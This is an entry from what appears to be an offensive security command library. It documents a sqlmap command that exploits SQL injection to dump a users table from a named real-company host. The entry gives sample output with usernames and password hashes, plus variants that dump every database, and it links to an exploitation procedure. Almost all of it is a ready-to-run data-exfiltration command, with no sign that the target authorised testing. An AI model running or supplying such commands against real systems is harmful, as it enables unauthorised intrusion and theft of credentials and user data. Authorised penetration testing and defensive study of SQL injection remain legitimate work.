---
id: cmd-uuid-002
data: >-
  sqlmap -u "https://target.ibm.com/access-control/endpoint?client_id=1" -D
  ibm_db -T users --dump --batch
tags:
  - sqli
  - exfiltration
type: command
output: >-
  Database: ibm_db\nTable: users\n[5 entries]\n+----+----------+----------+\n|
  id | username | password |\n+----+----------+----------+\n| 1  | admin    |
  hash123  |\n...
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.376Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump

## Command

```bash
sqlmap -u "https://target.ibm.com/access-control/endpoint?client_id=1" -D ibm_db -T users --dump --batch
```

## Description

This command exploits a confirmed SQLi to dump data from a specific database table, extracting sensitive information like credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL | Yes |
| `-D` | Database name | Yes |
| `-T` | Table name | Yes |
| `--dump` | Dump table contents | Yes |
| `--batch` | Non-interactive | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com/page?id=1" --dump -D db -T table
```

### Advanced Usage

```bash
sqlmap -u "https://example.com/page?id=1" --dump-all --batch
```

## Expected Output

Tabular dump of table data, including rows of sensitive information.

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-in-Client-ID-Parameter]]
